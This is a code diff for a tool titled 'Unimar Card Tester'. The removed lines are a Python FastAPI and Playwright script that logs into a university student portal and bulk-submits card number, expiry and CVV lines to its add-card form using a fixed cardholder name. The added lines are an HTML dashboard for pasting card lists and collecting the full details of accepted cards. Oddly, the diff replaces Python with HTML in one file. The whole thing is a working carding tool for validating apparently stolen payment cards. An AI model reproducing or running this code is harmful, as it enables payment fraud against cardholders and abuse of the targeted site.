@@ -1,202 +1,244 @@
-import asyncio
-import os
-import random
-from contextlib import asynccontextmanager
-from pathlib import Path
+<!DOCTYPE html>
+<html lang="pt-BR" class="h-full overflow-hidden m-0 p-0">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gerenciador de Processamento Multi-Contexto v6.1</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #09090b; }
+        ::-webkit-scrollbar-thumb { background: #27272a; border-radius: 9px; }
+        textarea { resize: none !important; }
+        .caixa-scroll-interna { overflow-y: auto !important; overflow-x: hidden !important; }
+    </style>
+</head>
+<body class="bg-[#09090b] text-zinc-300 h-screen max-h-screen flex flex-col justify-between antialiased overflow-hidden select-none m-0 p-0">
 
-import uvicorn
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse
-from pydantic import BaseModel
+    <header class="h-[64px] border-b border-zinc-800/60 bg-[#09090b] px-6 py-2 flex items-center justify-between gap-4 flex-shrink-0">
+        <div class="flex items-center space-x-3">
+            <div class="bg-indigo-500/10 p-2 rounded-xl border border-indigo-500/20">
+                <i class="fa-solid fa-layer-group text-indigo-400 text-sm"></i>
+            </div>
+            <div>
+                <h1 class="text-sm md:text-base font-semibold tracking-tight text-zinc-100">
+                    Multi-Context Manager 
+                    <span class="text-[10px] bg-zinc-800 text-zinc-300 font-medium px-2 py-0.5 rounded-full border border-zinc-700">v6.1</span>
+                </h1>
+                <p class="text-[11px] text-zinc-500 font-medium">Unimar Card Tester • WebSocket</p>
+            </div>
+        </div>
+        
+        <div class="flex items-center text-xs">
+            <div id="status-container" class="flex items-center gap-2 bg-zinc-900 border border-zinc-800 px-3 py-1.5 rounded-xl">
+                <span id="status-led" class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                <span id="status-texto" class="font-medium text-[11px] text-emerald-400">Conectado via WebSocket</span>
+            </div>
+        </div>
+    </header>
 
-from playwright.async_api import async_playwright
+    <main class="flex-1 grid grid-cols-1 lg:grid-cols-3 gap-5 p-6 max-w-[1600px] w-full mx-auto overflow-hidden min-h-0">
+        
+        <div class="lg:col-span-2 flex flex-col h-full space-y-5 min-h-0 overflow-hidden">
+            
+            <!-- Barra de Progresso -->
+            <div id="wrapper-progresso" class="bg-zinc-900/50 border border-zinc-800/80 rounded-2xl p-5 shadow-xl backdrop-blur-md hidden">
+                <div class="flex justify-between items-center mb-2 text-xs font-bold uppercase tracking-wider">
+                    <div class="flex items-center gap-2 text-zinc-300">
+                        <i class="fa-solid fa-circle-notch animate-spin text-indigo-400"></i>
+                        <span>Progresso do Lote</span>
+                    </div>
+                    <span id="txt-porcentagem" class="font-mono text-indigo-400">0%</span>
+                </div>
+                <div class="w-full bg-zinc-950 border border-zinc-800/60 h-3 rounded-full overflow-hidden">
+                    <div id="barra-preenchimento" class="bg-gradient-to-r from-indigo-500 to-violet-500 h-full w-0 rounded-full transition-all duration-500"></div>
+                </div>
+                <div class="flex justify-between text-[11px] text-zinc-500 mt-2">
+                    <span id="txt-contador-progresso" class="font-mono">0 / 0</span>
+                    <span id="txt-status-progresso" class="font-medium">Aguardando início...</span>
+                </div>
+            </div>
 
-# ===================== CONFIG =====================
-URL_LOGIN = "https://digital.unimar.br/login"
-URL_MEUS_CARTOES = "https://digital.unimar.br/areadoaluno/conta/meuscartoes"
+            <!-- Instâncias Paralelas -->
+            <div class="bg-zinc-900/50 border border-zinc-800/80 rounded-2xl p-4 shadow-xl backdrop-blur-md">
+                <div class="flex items-center justify-between mb-3">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-sliders text-indigo-400"></i>
+                        <h2 class="text-[11px] font-bold text-zinc-400 uppercase tracking-wider">INSTÂNCIAS PARALELAS</h2>
+                    </div>
+                </div>
+                <div class="inline-flex p-1 bg-zinc-950 border border-zinc-800/80 rounded-xl" id="canais-buttons"></div>
+                <input type="hidden" id="canais" value="4">
+            </div>
 
-EMAIL = os.getenv("UNIMAR_EMAIL")
-SENHA = os.getenv("UNIMAR_SENHA")
-NOME_FIXO = "Bruna Mendes"
+            <!-- Lista de Cartões -->
+            <div class="flex-1 bg-zinc-900/50 border border-zinc-800/80 rounded-2xl p-4 shadow-xl backdrop-blur-md flex flex-col">
+                <div class="flex items-center justify-between mb-3">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-terminal text-indigo-400"></i>
+                        <h2 class="text-[11px] font-bold text-zinc-400 uppercase tracking-wider">Lista de Cartões</h2>
+                    </div>
+                </div>
+                <textarea id="lista-cartoes" class="caixa-scroll-interna flex-1 bg-zinc-950 border border-zinc-800/80 rounded-xl p-4 font-mono text-sm focus:outline-none focus:border-indigo-500"></textarea>
+                
+                <div class="flex gap-3 mt-4">
+                    <button onclick="iniciarTeste()" id="btn-iniciar"
+                        class="flex-1 bg-indigo-600 hover:bg-indigo-500 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-bolt"></i> INICIAR PROCESSAMENTO
+                    </button>
+                    <button onclick="pararTeste()" id="btn-parar"
+                        class="flex-1 bg-rose-600 hover:bg-rose-500 py-3 rounded-xl font-medium transition-all hidden items-center justify-center gap-2">
+                        <i class="fa-solid fa-stop"></i> INTERROMPER
+                    </button>
+                </div>
+            </div>
+        </div>
 
-# ===================== ESTADO =====================
-estado = {
-    "rodando": False,
-    "clients": set(),
-    "total_cartoes": 0,
-    "processados": 0,
-    "aprovados": 0,
-}
+        <!-- Painel Direito -->
+        <div class="flex flex-col h-full space-y-5 min-h-0 overflow-hidden">
+            
+            <!-- Aprovados -->
+            <div class="flex-1 bg-zinc-900/50 border border-zinc-800/80 rounded-2xl p-4 shadow-xl flex flex-col">
+                <div class="flex justify-between mb-3">
+                    <h2 class="text-[11px] font-bold text-zinc-400 uppercase tracking-wider flex items-center gap-2">
+                        <i class="fa-solid fa-circle-check text-emerald-400"></i> Aprovados
+                    </h2>
+                    <span id="contador-aprovados" class="text-emerald-400 font-bold">0</span>
+                </div>
+                <div id="container-aprovados" class="caixa-scroll-interna flex-1 bg-zinc-950 border border-zinc-800/80 rounded-xl p-3 space-y-2"></div>
+            </div>
 
-def log(mensagem: str):
-    print(f"[LOG] {mensagem}")
-    asyncio.create_task(broadcast("log", {"mensagem": mensagem}))
+            <!-- Logs -->
+            <div class="flex-1 bg-zinc-900/50 border border-zinc-800/80 rounded-2xl p-4 shadow-xl flex flex-col">
+                <div class="flex justify-between mb-3">
+                    <h2 class="text-[11px] font-bold text-zinc-400 uppercase tracking-wider">Histórico de Eventos</h2>
+                    <button onclick="limparLogsInterface()" class="text-xs text-zinc-400 hover:text-white">Limpar</button>
+                </div>
+                <div id="container-logs" class="caixa-scroll-interna flex-1 bg-zinc-950 border border-zinc-800/80 rounded-xl p-4 font-mono text-xs text-zinc-400 overflow-auto"></div>
+            </div>
+        </div>
+    </main>
 
-async def broadcast(type: str, data: dict = None):
-    if data is None:
-        data = {}
-    message = {"type": type, **data}
-    for client in list(estado["clients"]):
-        try:
-            await client.send_json(message)
-        except:
-            estado["clients"].discard(client)
+    <script>
+        let socket;
+        let testeIniciado = false;
+        let totalCartoes = 0;
+        let processados = 0;
+        let aprovadosList = [];
 
-# ===================== LIFESPAN =====================
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    Path("aprovados.txt").touch(exist_ok=True)
-    yield
+        function criarBotoesCanais() {
+            const container = document.getElementById('canais-buttons');
+            container.innerHTML = '';
+            const selected = parseInt(document.getElementById('canais').value);
+            
+            for (let i = 1; i <= 6; i++) {
+                const btn = document.createElement('button');
+                btn.className = `px-6 py-3 mx-1 rounded-lg font-mono text-sm font-semibold transition-all ${
+                    i === selected 
+                        ? 'bg-indigo-600 text-white shadow-md shadow-indigo-500/50' 
+                        : 'bg-zinc-800 hover:bg-zinc-700 text-zinc-300'
+                }`;
+                btn.textContent = i;
+                btn.onclick = () => {
+                    document.getElementById('canais').value = i;
+                    criarBotoesCanais();
+                };
+                container.appendChild(btn);
+            }
+        }
 
-app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)
+        function conectarWebSocket() {
+            socket = new WebSocket(`wss://${window.location.host}/ws`);
+            
+            socket.onopen = () => {
+                document.getElementById('status-texto').textContent = "WebSocket Conectado";
+            };
 
-# ===================== WEBSOCKET =====================
-@app.websocket("/ws")
-async def websocket_endpoint(websocket: WebSocket):
-    await websocket.accept()
-    estado["clients"].add(websocket)
-    try:
-        while True:
-            await asyncio.sleep(10)
-    except WebSocketDisconnect:
-        estado["clients"].discard(websocket)
+            socket.onmessage = (event) => {
+                const data = JSON.parse(event.data);
 
-# ===================== PLAYWRIGHT =====================
-async def login_mestre(playwright):
-    try:
-        log("[Autenticação] Iniciando login...")
-        browser = await playwright.chromium.launch(
-            headless=True,
-            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
-        )
-        context = await browser.new_context()
-        page = await context.new_page()
+                if (data.type === "log") {
+                    const logsContainer = document.getElementById('container-logs');
+                    const p = document.createElement('p');
+                    p.textContent = data.mensagem;
+                    logsContainer.appendChild(p);
+                    logsContainer.scrollTop = logsContainer.scrollHeight;
 
-        await page.goto(URL_LOGIN, wait_until="networkidle", timeout=60000)
-        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
-        await page.get_by_role("textbox", name="Senha").fill(SENHA)
-        await page.get_by_role("button", name="Entrar").click()
+                    if (data.mensagem.includes("APROVADO") || data.mensagem.includes("RESULTADO")) {
+                        processados++;
+                        atualizarProgresso();
+                    }
+                }
 
-        await page.wait_for_selector("text=Meus Cartões", timeout=30000)
-        await context.storage_state(path="sessao_unimar.json")
+                if (data.type === "aprovado") {
+                    adicionarAprovado(data.cartao);
+                }
+            };
 
-        await context.close()
-        await browser.close()
-        log("[Autenticação] Login realizado com sucesso!")
-        return True
-    except Exception as e:
-        log(f"[ERRO] Login falhou: {e}")
-        return False
+            socket.onclose = () => {
+                document.getElementById('status-texto').textContent = "Reconectando...";
+                setTimeout(conectarWebSocket, 2000);
+            };
+        }
 
+        function adicionarAprovado(cartao) {
+            if (aprovadosList.includes(cartao)) return;
+            aprovadosList.push(cartao);
 
-async def worker(id_worker: int, browser, fila: asyncio.Queue):
-    context = await browser.new_context(storage_state="sessao_unimar.json")
-    page = await context.new_page()
-    await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
+            const container = document.getElementById('container-aprovados');
+            const div = document.createElement('div');
+            div.className = "p-3 bg-emerald-900/30 border border-emerald-700 rounded-xl text-xs font-mono text-emerald-300";
+            div.textContent = cartao;
+            container.appendChild(div);
+            document.getElementById('contador-aprovados').textContent = aprovadosList.length;
+        }
 
-    try:
-        while not fila.empty() and estado["rodando"]:
-            idx, linha, _ = await fila.get()
-            try:
-                numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
-                log(f"[Canal {id_worker}] #{idx} → {numero[-4:]}")
+        function atualizarProgresso() {
+            if (totalCartoes <= 0) return;
+            const percent = Math.min(Math.round((processados / totalCartoes) * 100), 100);
+            document.getElementById('barra-preenchimento').style.width = percent + '%';
+            document.getElementById('txt-porcentagem').textContent = percent + '%';
+            document.getElementById('txt-contador-progresso').textContent = `${processados} / ${totalCartoes}`;
+        }
 
-                await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
-                await asyncio.sleep(random.uniform(0.5, 1.5))
+        function iniciarTeste() {
+            const lista = document.getElementById('lista-cartoes').value.trim();
+            if (!lista) return alert("Insira a lista de cartões!");
 
-                await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
+            totalCartoes = lista.split('\n').filter(l => l.trim()).length;
+            processados = 0;
+            aprovadosList = [];
 
-                await page.get_by_role("textbox", name="Número do cartão").fill(numero)
-                await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
-                await page.get_by_label("Mês").select_option(mes)
-                await page.get_by_label("Ano").select_option(ano)
-                await page.get_by_role("textbox", name="CVV").fill(cvv)
+            fetch('/api/iniciar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    lista: lista, 
+                    canais: parseInt(document.getElementById('canais').value) 
+                })
+            });
 
-                botoes_antes = await page.get_by_role("button", name="Remover").count()
-                await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
+            testeIniciado = true;
+            document.getElementById('wrapper-progresso').classList.remove('hidden');
+            document.getElementById('btn-iniciar').classList.add('hidden');
+            document.getElementById('btn-parar').classList.remove('hidden');
+        }
 
-                for _ in range(20):
-                    if not estado["rodando"]: break
-                    if await page.get_by_role("button", name="Remover").count() > botoes_antes:
-                        log(f"[Canal {id_worker}] ✅ APROVADO: {numero[-4:]}")
-                        await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
-                        estado["aprovados"] += 1
-                        break
+        function pararTeste() {
+            fetch('/api/parar', { method: 'POST' });
+        }
 
-                    body = (await page.locator("body").inner_text()).lower()
-                    if any(x in body for x in ["inválida", "recusado", "erro"]):
-                        log(f"[Canal {id_worker}] ❌ Reprovado: {numero[-4:]}")
-                        break
-                    await asyncio.sleep(1)
-            except Exception as e:
-                log(f"[Erro] Item #{idx}: {e}")
-            finally:
-                estado["processados"] += 1
-                fila.task_done()
-    finally:
-        await context.close()
+        function limparLogsInterface() {
+            document.getElementById('container-logs').innerHTML = '';
+        }
 
-
-async def processar_cartoes(texto_cartoes: str, num_canais: int):
-    try:
-        linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
-        linhas = list(dict.fromkeys(linhas))
-
-        estado["total_cartoes"] = len(linhas)
-        estado["processados"] = 0
-        estado["aprovados"] = 0
-
-        fila = asyncio.Queue()
-        for idx, linha in enumerate(linhas, 1):
-            await fila.put((idx, linha, 1))
-
-        async with async_playwright() as pw:
-            if not await login_mestre(pw):
-                return
-
-            browser = await pw.chromium.launch(
-                headless=True,
-                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
-            )
-            tasks = [asyncio.create_task(worker(i, browser, fila)) for i in range(1, num_canais + 1)]
-            await asyncio.gather(*tasks, return_exceptions=True)
-
-            await browser.close()
-
-    except Exception as e:
-        log(f"[ERRO CRÍTICO] {e}")
-    finally:
-        estado["rodando"] = False
-        await broadcast("status", {"rodando": False})
-        log("[Sistema] Processamento finalizado.")
-
-
-# ===================== ROTAS =====================
-class IniciarRequest(BaseModel):
-    lista: str
-    canais: int = 4
-
-@app.post("/api/iniciar")
-async def iniciar(data: IniciarRequest):
-    if estado["rodando"]:
-        return {"status": "já_em_execucao"}
-    
-    estado["rodando"] = True
-    await broadcast("status", {"rodando": True})
-    asyncio.create_task(processar_cartoes(data.lista, data.canais))
-    return {"status": "iniciado"}
-
-@app.post("/api/parar")
-async def parar():
-    estado["rodando"] = False
-    log("⛔ Teste interrompido.")
-    await broadcast("status", {"rodando": False})
-    return {"status": "parando"}
-
-@app.get("/", response_class=HTMLResponse)
-async def index():
-    with open("templates/index.html", encoding="utf-8") as f:
-        return f.read()
-
-if __name__ == "__main__":
-    uvicorn.run("main:app", host="0.0.0.0", port=5000)
+        window.onload = () => {
+            criarBotoesCanais();
+            conectarWebSocket();
+        };
+    </script>
+</body>
+</html>
